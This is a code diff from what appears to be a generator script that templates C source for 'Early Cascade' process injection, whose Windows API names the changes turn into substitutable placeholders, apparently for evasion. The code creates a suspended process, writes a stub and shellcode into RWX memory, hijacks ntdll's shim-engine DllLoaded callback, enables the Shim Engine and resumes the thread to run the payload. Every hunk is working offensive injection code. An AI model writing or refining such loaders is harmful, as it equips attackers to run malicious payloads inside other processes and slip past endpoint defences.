@@ -375,7 +375,7 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
         
     printf("[*] Create a process in suspended mode ( %s )\\n", "$target");
 
-    if ( !CreateProcessA(
+    if ( !{CreateProcessA}(
         NULL, 
         "$target", 
         NULL, 
@@ -392,7 +392,7 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
     puts( "[+] The process has been created successfully" );
 
     puts( "[*] Getting a handle on NtDLL" );
-    hNtDLL = GetModuleHandleA( "NtDLL" );
+    hNtDLL = {GetModuleHandleA}( "NtDLL" );
     printf( "[+] NtDLL Base Address = 0x%p\\n", hNtDLL );
 
     puts( "[*] Dynamically Search for the Callback Pointer Address ( g_pfnSE_DllLoaded )");
@@ -406,7 +406,7 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
     do {{
 
         puts( "[*] Remotley allocate memory for both stub & shellcode" );
-        if ( !(pBuffer = VirtualAllocEx(pi.hProcess, NULL, $stubSize + {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) )
+        if ( !(pBuffer = {VirtualAllocEx}(pi.hProcess, NULL, $stubSize + {shellcodeSize}, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)) )
             break;
 
         /* Shellcode address */
@@ -419,14 +419,14 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
         RtlCopyMemory( find_pattern(x64_stub, $stubSize, "\\x11\\x11\\x11\\x11\\x11\\x11\\x11\\x11", 8), &pShimsEnabledAddress, sizeof(LPVOID) );
 
         puts( "[*] Injecting our cascade stub" );
-        if ( !WriteProcessMemory(pi.hProcess, pBuffer, x64_stub, $stubSize, NULL) ){{
+        if ( !{WriteProcessMemory}(pi.hProcess, pBuffer, x64_stub, $stubSize, NULL) ){{
             break;
         }}
 
         puts( "[+] Our stub has been successfully injected into the remote process" );
 
         puts( "[*] Injecting our Shellcode" );
-        if ( !WriteProcessMemory(pi.hProcess, (LPVOID)((DWORD_PTR)pBuffer + $stubSize), shellcode, {shellcodeSize}, NULL) )
+        if ( !{WriteProcessMemory}(pi.hProcess, (LPVOID)((DWORD_PTR)pBuffer + $stubSize), shellcode, {shellcodeSize}, NULL) )
             break;
 
         puts( "[+] Our Shellcode has been successfully injected into the remote process" );
@@ -435,19 +435,19 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
         printf( "[*] The Callback Address has been encoded to 0x%p\\n", pPtr );
 
         puts ("[*] Hijacking the Callback for making it executes our stub" );
-        if ( !WriteProcessMemory(pi.hProcess, pSE_DllLoadedAddress, (LPCVOID) &pPtr, sizeof(LPVOID), NULL) )
+        if ( !{WriteProcessMemory}(pi.hProcess, pSE_DllLoadedAddress, (LPCVOID) &pPtr, sizeof(LPVOID), NULL) )
             break;
 
         puts( "[+] Hijacking has been done successfully" );
 
         puts( "[*] Enabling Shim Engine for triggering our stub later" );
-        if ( !WriteProcessMemory(pi.hProcess, pShimsEnabledAddress, (LPCVOID) &bEnable, sizeof(BOOL), NULL) )
+        if ( !{WriteProcessMemory}(pi.hProcess, pShimsEnabledAddress, (LPCVOID) &bEnable, sizeof(BOOL), NULL) )
             break;
 
         puts( "[+] Shim Engine is enabled now" );
         
         puts( "[*] Triggering the callback" );
-        if ( !ResumeThread(pi.hThread) )
+        if ( !{ResumeThread}(pi.hThread) )
             break;
 
         puts( "[+] Injection has been done successfully" );
@@ -460,8 +460,8 @@ LPVOID find_ShimsEnabledAddress(HANDLE hNtDLL, LPVOID pDllLoadedOffsetAddress) {
 
     puts( "[*] Cleaning up" );
     if ( pi.hThread )
-        CloseHandle( pi.hThread );
+        {CloseHandle}( pi.hThread );
 
     if ( pi.hProcess )
-        CloseHandle( pi.hProcess );
+        {CloseHandle}( pi.hProcess );
 """).substitute(target=self.target, stubSize = self.stubSize)
